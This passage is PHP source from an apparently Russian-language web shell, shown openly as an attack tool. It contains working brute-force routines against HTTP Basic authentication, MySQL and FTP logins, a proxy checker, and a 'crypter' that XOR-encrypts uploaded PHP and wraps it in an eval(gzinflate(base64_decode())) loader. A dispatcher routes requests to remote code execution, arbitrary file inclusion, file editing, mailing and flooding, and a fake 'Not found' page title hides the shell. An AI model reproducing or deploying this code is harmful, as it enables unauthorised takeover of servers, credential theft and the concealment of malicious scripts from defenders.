value=\"http://vburton.ncsa.uiuc.edu/wordlist.txt\" name=url size=35></td></tr><tr><td width=\"20%\">Сохранить в:</td><td><input type=text value=\"$temp/.dic\" name=output size=35></td></tr><tr><td width=\"20%\"></td><td><input type=checkbox style=\"border-width:1px;background-color:#666666;\" name=combo value=1 checked>Вывод в Combo-стиле</td></tr><tr><td></td><td align=right>$hcwd<input class=buttons type=submit value=Загрузить></td></tr></form></table></center>";}

}

function calc(){

global $t,$et,$hcwd;

$fu = array('-','md5','sha1','crc32','hex','ip2long','long2ip','base64_encode','base64_decode','urldecode','urlencode');

if (!empty($_REQUEST['input']) && (in_array($_REQUEST['to'],$fu))){

echo "<center>${t}Вывод:<br><textarea rows=\"10\" cols=\"64\">";

if($_REQUEST['to']!='hex')echo $_REQUEST['to']($_REQUEST['input']);else for($i=0;$i<strlen($_REQUEST['input']);$i++)echo strtoupper(dechex(ord($_REQUEST['input']{$i})));

echo "</textarea>$et</center><br>";

}

echo "<center>${t}Конвертер:</td><td></td></tr><form method=\"POST\"><tr><td width=\"20%\">Ввод:</td><td><textarea rows=\"10\" name=\"input\" cols=\"64\">";if(!empty($_REQUEST['input']))echo htmlspecialchars($_REQUEST['input']);echo "</textarea></td></tr><tr><td width=\"20%\">Задание:</td><td><select size=1 name=to><option value=md5>MD5</option><option value=sha1>SHA1</option><option value=crc32>crc32</option><option value=ip2long>IP to long</option><option value=long2ip>Long to IP</option><option value=hex>HEX</option><option value=urlencode>URL encoding</option><option value=urldecode>URL decoding</option><option value=base64_encode>Base64 encoding</option><option value=base64_decode>Base64 decoding</option></select></td><tr><td width=\"20%\"></td><td align=right><input class=buttons type=submit value=Конвертировать></td></tr>$hcwd</form></table></center>";

}

function authcracker(){

global $errorbox,$et,$t,$crack,$hcwd;

if(!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){

$data='';

$method=($_REQUEST['method'])?'POST':'GET';

if(strstr($_REQUEST['target'],'?')){$data=substr($_REQUEST['target'],strpos($_REQUEST['target'],'?')+1);$_REQUEST['target']=substr($_REQUEST['target'],0,strpos($_REQUEST['target'],'?'));}

list($host)=explode("/",$_REQUEST['target']);

$page=substr($_REQUEST['target'],strpos($_REQUEST['target'],"/")+1);

$type=$_REQUEST['combo'];

$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";

if($method='GET')$page.=$data;

$dictionary=fopen($_REQUEST['dictionary'],'r') or exit('Dictionary error');

echo "<font color=blue>";

while(!feof($dictionary)){

if($type){

$combo=trim(fgets($dictionary)," \r\n");

$user=substr($combo,0,strpos($combo,':'));

$pass=substr($combo,strpos($combo,':')+1);

}else{

$pass=trim(fgets($dictionary)," \n\r");

}

$so=fsockopen($host,80,$en,$es,8);

if(!$so){echo "$errorbox Нет связи$et";break;}

else{

$packet="$method /$page HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nConnection: Close\r\nAuthorization: Basic ".base64_encode("$user:$pass");

if($method=='POST')$packet.="Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ".strlen($data);

$packet.="\r\n\r\n";

$packet.=$data;

fputs($so,$packet);

$res=substr(fgets($so),9,2);

fclose($so);

if($res=='20')echo "U: $user P: $pass</br>";

flusher();

}

}

echo "Готово!</font>";

}else echo "<center><form method=\"POST\" name=form>${t}Брут HTTP-авторизации:</td><td><select name=method><option value=1>POST</option><option value=0>GET</option></select></td></tr><tr><td width=\"20%\">Словарь:</td><td><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\">Тип словаря:</td><td><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"20%\">Имя:</td><td><input type=text size=35 value=root name=user></td></tr><tr><td width=\"20%\">Сервер:</td><td><input type=text name=target value=localhost size=35></td></tr><tr><td width=\"20%\"></td><td align=right>$hcwd<input class=buttons type=submit value=Старт></td></tr></form></table></center>";

}

function sqlcracker(){

global $errorbox,$t,$et,$crack;

if (!function_exists("mysql_connect")){

echo "$errorbox Server does not support MySQL$et";

}

else{

if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){

$target=$_REQUEST['target'];

$type=$_REQUEST['combo'];

$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";

$dictionary=fopen($_REQUEST['dictionary'],'r');

if ($dictionary){

echo "<font color=blue>Ломаем ".htmlspecialchars($target)."...<br>";

while(!feof($dictionary)){

if($type){

$combo=trim(fgets($dictionary)," \n\r");

$user=substr($combo,0,strpos($combo,':'));

$pass=substr($combo,strpos($combo,':')+1);

}else{

$pass=trim(fgets($dictionary)," \n\r");

}

$sql=@mysql_connect($target,$user,$pass);

if($sql){echo "U: $user P: $pass (<a href=\"".hlink("sec=mysql&server=$target&user=$user&pasr=$pass&query=SHOW+DATABASES&workingdir=".getcwd())."\">Подключиться</a>)<br>";mysql_close($sql);if(!$type)break;}

flusher();

}

echo "<br>Готово!</font>";

fclose($dictionary);

}

else{

echo "$errorbox Невозможно открыть словарь.$et";

}

}

else{

echo "<center>${t}MySQL брут:$crack";

}

}

}

function ftpcracker(){

global $errorbox,$t,$et,$crack;

if (!function_exists("ftp_connect"))echo "$errorbox Сервер не поддерживает FTP функций$et";

else{

if (!empty($_REQUEST['target']) && !empty($_REQUEST['dictionary'])){

$target=$_REQUEST['target'];

$type=$_REQUEST['combo'];

$user=(!empty($_REQUEST['user']))?$_REQUEST['user']:"";

$dictionary=fopen($_REQUEST['dictionary'],'r');

if ($dictionary){

echo "<font color=blue>Ломаем ".htmlspecialchars($target)."...<br>";

while(!feof($dictionary)){

if($type){

$combo=trim(fgets($dictionary)," \n\r");

$user=substr($combo,0,strpos($combo,':'));

$pass=substr($combo,strpos($combo,':')+1);

}else{

$pass=trim(fgets($dictionary)," \n\r");

}

if(!$ftp=ftp_connect($target,21,8)){echo "$errorbox Невозможно подключиться к серверу.$et";break;}

if (@ftp_login($ftp,$user,$pass)){echo "U: $user P: $pass<br>";if(!$type)break;}

ftp_close($ftp);

flusher();

}

echo "<br>Готово!</font>";

fclose($dictionary);

}

else{

echo "$errorbox Невозможно открыть словарь.$et";

}

}

else echo "<center>${t}FTP брут:$crack";

}}

function openit($name){

$ext=strtolower(substr($name,strrpos($name,'.')+1));

$src=array('php','php3','php4','phps','phtml','phtm','inc');

if(in_array($ext,$src)) {

echo "<div style=\"margin: 0px;padding: 7px;border: 1px inset;width: 830px;height: 600px;overflow: auto;background-color: #C0C0C0;color: #000000\">";

highlight_file($name);

echo "</div>";

}

else echo "<div style=\"margin: 0px;padding: 7px;border: 1px inset;width: 830px;height: 600px;overflow: auto;background-color: #C0C0C0;color: #000000\"><font color=black><pre>".htmlspecialchars(file_get_contents($name))."</pre></font></div>";

}

function proxycheck() {

global $et,$msgbox;

$file=$_REQUEST['file'];

echo $msgbox;

if (!isset($file) || empty($file)) { ?>

<form action="#" method='post'>

Введите прокси <br><textarea name='file' cols='100' rows='20'>195.39.68.121:8080

proxy.domen.com:3128</textarea><br><br>

<input type='submit' value='Проверить'></form>

<?

}

$good="";

$timeout="5";

if(isset($file))

{

$start = time ();

while (strstr($file,"\r\n\r\n")) {

$file=str_replace("\r\n\r\n", "\r\n", $file);

}

$proxy=explode ("\r\n", $file);

$vse = count($proxy);

echo "<center><font color=blue><b>Пожалуйста, не закрывайте окно браузера до окончания проверки!</b></font></center>";

echo "<center>Всего проксей:<b> $vse<br><br><br><br></b></center>";

foreach($proxy as $index => $proxy )

{

if(isset($proxy) && !empty($proxy))

{

$prox = explode (":",$proxy);

$addr=gethostbyname($prox[0]);

$prox[1] = str_replace("\r","",$prox[1]);

$prox[1] = str_replace("\n","",$prox[1]);

$fp = fsockopen($addr,$prox[1], $errno, $errstr, $timeout);

ob_implicit_flush();

if(!$fp)

{

ob_implicit_flush();

echo "<font color=red>$proxy не работает...</font><br>";

}

else

{

ob_implicit_flush();

echo "<b><font color=green>$proxy работает!</font></b><br>";

$good .= $proxy."<br>";

}

}

}

$time = time ();

$end_time = $time - $start ;

echo "Затрачено времени: $end_time сек.<br>";

echo "Хорошие прокси:<br><br>$good";

}

echo $et;

}

if ($_REQUEST['sec'] == 'cryptphp') {

global $msgbox,$et;

if (!isset($_GET['crypt']) || empty($HTTP_POST_FILES['file'])) {

?>

<html>

<head>

<? echo $mainmenu; ?>

<title>Not found - <?=getcwd();?></title>

</head>

<body text="#ffffff" bgcolor="#181818" link="#DCDCDC" vlink="#DCDCDC" alink="#DCDCDC" onLoad="writeMenus()" onResize="if (isNS4) nsResizeHandler()">

<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#282828" bgcolor="#333333" width="100%">

<tr><td><br>System date: <? echo $date." ".$time_now; ?></td></tr></table><hr size=1 noshade>

<?=$msgbox;?>

<h1>Криптор PHP скриптов</h1>

<br />

<form action="<? echo hlink("sec=cryptphp&crypt=1"); ?>" method="post" enctype="multipart/form-data">

Загрузите ваш скрипт:<br />

<small>(Разрешённые расширения: php, php3, php4, php5)</small><br />

<input type="file" name="file" />&nbsp;<input type="submit" value="Crypt it!" /><br />

</form>

<? echo $et.$footer; ?>

</body>

</html>

<?php

exit();

} else {

$file_ext=get_file_ext($HTTP_POST_FILES['file']['name']);

if ($file_ext != "php" && $file_ext != "php3" && $file_ext != "php4" && $file_ext != "php5") {

die ("<h2>Загруженный файл не является РНР скриптом!</h2>");

}

$input = $_FILES['file']['tmp_name'];

$f=join("", file($input));

$key = rand(1,99);

$new = '';$len=strlen($f);

for($i=0;$i<$len;$i++)

{

$new .= chr(ord($f[$i]) ^ $key);

}

$new=str_replace("\"","\\\"",$new);

$new=str_replace("\$","\\$",$new);

$kaka1=rand(0,99);

$kaka2=rand(0,99);

$kaka3=rand(0,99);

$kaka4=rand(0,99);

$kaka5=rand(0,99);

$kaka6=rand(0,99);

$kaka7=rand(0,99);

$kaka8=rand(0,99);

$kaka9=rand(0,99);

$code1 = base64_encode(gzdeflate("\$k".$kaka1."e".$kaka2."y".$kaka3."_t".$kaka4."h".$kaka5."a".$kaka6."t".$kaka7."_".$kaka8."s".$kaka9."c".$kaka2."r".$kaka3."i".$kaka4."p".$kaka5."t".$kaka6."_".$kaka7."i".$kaka8."s".$kaka9."_".$kaka3."c".$kaka4."r".$kaka5."y".$kaka6."p".$kaka7."t".$kaka8."e".$kaka9."d".$kaka4."=".$key.";\$r".$kaka2."e".$kaka4."s".$kaka6."o".$kaka8."u".$kaka1."r".$kaka3."c".$kaka5."e_c".$kaka7."r".$kaka9."y".$kaka1."p".$kaka2."t".$kaka3."e".$kaka4."d_c".$kaka5."o".$kaka6."d".$kaka7."e".$kaka8."=\"".$new."\";\$s".$kaka1."t".$kaka3."r".$kaka5."i".$kaka7."n".$kaka9."g_o".$kaka2."u".$kaka4."t".$kaka6."p".$kaka8."u".$kaka5."t".$kaka9."=\$r".$kaka2."e".$kaka4."s".$kaka6."o".$kaka8."u".$kaka1."r".$kaka3."c".$kaka5."e_c".$kaka7."r".$kaka9."y".$kaka1."p".$kaka2."t".$kaka3."e".$kaka4."d_c".$kaka5."o".$kaka6."d".$kaka7."e".$kaka8.";\$l".$kaka9."e".$kaka8."n".$kaka7."t".$kaka6."h_o".$kaka5."f_c".$kaka4."r".$kaka3."y".$kaka2."p".$kaka1."t".$kaka8."e".$kaka7."d_c".$kaka6."o".$kaka5."d".$kaka4."e".$kaka3."=strlen(\$s".$kaka1."t".$kaka3."r".$kaka5."i".$kaka7."n".$kaka9."g_o".$kaka2."u".$kaka4."t".$kaka6."p".$kaka8."u".$kaka5."t".$kaka9.");\$e".$kaka9."v".$kaka7."a".$kaka5."l_p".$kaka3."h".$kaka1."p_c".$kaka2."o".$kaka4."d".$kaka6."e".$kaka8."='';for(\$h".$kaka8."u".$kaka6."i".$kaka4."v".$kaka2."a".$kaka1."m".$kaka3."v".$kaka5."s".$kaka7."e".$kaka9."m=0;\$h".$kaka8."u".$kaka6."i".$kaka4."v".$kaka2."a".$kaka1."m".$kaka3."v".$kaka5."s".$kaka7."e".$kaka9."m<\$l".$kaka9."e".$kaka8."n".$kaka7."t".$kaka6."h_o".$kaka5."f_c".$kaka4."r".$kaka3."y".$kaka2."p".$kaka1."t".$kaka8."e".$kaka7."d_c".$kaka6."o".$kaka5."d".$kaka4."e".$kaka3.";\$h".$kaka8."u".$kaka6."i".$kaka4."v".$kaka2."a".$kaka1."m".$kaka3."v".$kaka5."s".$kaka7."e".$kaka9."m++)\$e".$kaka9."v".$kaka7."a".$kaka5."l_p".$kaka3."h".$kaka1."p_c".$kaka2."o".$kaka4."d".$kaka6."e".$kaka8." .= chr(ord(\$s".$kaka1."t".$kaka3."r".$kaka5."i".$kaka7."n".$kaka9."g_o".$kaka2."u".$kaka4."t".$kaka6."p".$kaka8."u".$kaka5."t".$kaka9."[\$h".$kaka8."u".$kaka6."i".$kaka4."v".$kaka2."a".$kaka1."m".$kaka3."v".$kaka5."s".$kaka7."e".$kaka9."m]) ^ \$k".$kaka1."e".$kaka2."y".$kaka3."_t".$kaka4."h".$kaka5."a".$kaka6."t".$kaka7."_".$kaka8."s".$kaka9."c".$kaka2."r".$kaka3."i".$kaka4."p".$kaka5."t".$kaka6."_".$kaka7."i".$kaka8."s".$kaka9."_".$kaka3."c".$kaka4."r".$kaka5."y".$kaka6."p".$kaka7."t".$kaka8."e".$kaka9."d".$kaka4.");eval(\"?>\".\$e".$kaka9."v".$kaka7."a".$kaka5."l_p".$kaka3."h".$kaka1."p_c".$kaka2."o".$kaka4."d".$kaka6."e".$kaka8.".\"<?\");",9));

$code="<? eval(gzinflate(base64_decode(\"".$code1."\"))); ?>";

header("Content-type: application/octet-stream");

header("Content-disposition: attachment; filename=\"crypted.".$file_ext."\";");

header("Content-length: ".strlen($code));

echo $code;

exit();

}

}

?>

<html>

<head>

<? echo $mainmenu; ?>

<title>Not found - <?=getcwd();?></title>

</head>

<body text="#ffffff" bgcolor="#181818" link="#DCDCDC" vlink="#DCDCDC" alink="#DCDCDC" onLoad="writeMenus()" onResize="if (isNS4) nsResizeHandler()">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#282828" bgcolor="#333333" width="100%">
</table><hr size=1 noshade>

<?php
if (!empty($_REQUEST['sec'])){
switch($_REQUEST['sec']){
case 'fm':filemanager();break;
case 'sc':scanner();break;
case 'phpinfo':ob_start();
phpinfo();
$phpinfo=ob_get_contents();
ob_end_clean();
$phpinfo=preg_replace("#<!DOCTYPE[^>]*?[>].*?<body>#is","",$phpinfo);
$phpinfo=preg_replace("#</body[^>]*?[>].*?</html>#is","",$phpinfo);
echo $phpinfo;
break;
case 'edit': if (!empty($_REQUEST['open']))editor($_REQUEST['file']);
if (!empty($_REQUEST['save'])){
$filehandle= fopen($_REQUEST['file'],"w");
fwrite($filehandle,$_REQUEST['edited']);
fclose($filehandle);}
if (!empty($_REQUEST['file'])) editor($_REQUEST['file']);else editor('');
break;
case 'openit':openit($_REQUEST['name']);break;
case 'cr': cracker();break;
case 'dic':dicmaker();break;
case 'whois':whois();break;
case 'hex':hexview();break;
case 'img':showimage($_REQUEST['file']);break;
case 'inc':include ($_REQUEST['file']);break;
case 'hc':hashcracker();break;
case 'fcr':formcracker();break;
case 'snmp':snmpcracker();break;
case 'sql':sqlcracker();break;
case 'auth':authcracker();break;
case 'pop3':pop3cracker();break;
case 'imap':imapcracker();break;
case 'smtp':smtpcracker();break;
case 'ftp':ftpcracker();break;
case 'eval':phpeval();break;
case 'http':http();break;
case 'px':proxy();break;
case 'webshell':webshell();break;
case 'mailer':mailer();break;
case 'tools':tools();break;
case 'asm':safemode();break;
case 'icq':icqbrute();break;
case 'code':calc();break;
case 'chmod':cm();break;
case 'selfremove':selfremove();break;
case 'hash':code();break;
case 'fflooder':fflooder();break;
case 'calc':calc();break;
case 'sysinfo':sysinfo();break;
case 'mbr':mrabrute();break;
case 'checksum':checksum($_REQUEST['file']);break;
case 'prc':proxycheck();break;
case 'about':echo $intro;break;
default: filemanager();
}}else { filemanager(); }
echo $footer;

?>
</body>
</html>